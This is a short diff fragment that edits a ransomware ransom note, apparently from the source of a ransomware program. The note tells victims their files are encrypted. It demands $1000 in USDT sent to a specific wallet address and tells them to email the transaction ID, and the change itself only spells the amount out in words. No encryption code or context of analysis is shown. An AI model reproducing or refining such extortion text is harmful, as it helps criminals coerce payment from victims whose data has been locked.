@@ -277,7 +277,7 @@ All your important files have been encrypted with military-grade encryption.
 Your documents, photos, videos, databases, and other files are no longer accessible.
 
 How to Recover Your Files?
-1. Send $1000 worth of USDT to this address:
+1. Send $1000 (one thousand dollars) worth of USDT to this address:
    USDT Address: TF6UzrorKH8RGpvPP2UwLrnXAV6o5uAsDS
    
 2. Email your USDT transaction ID to:
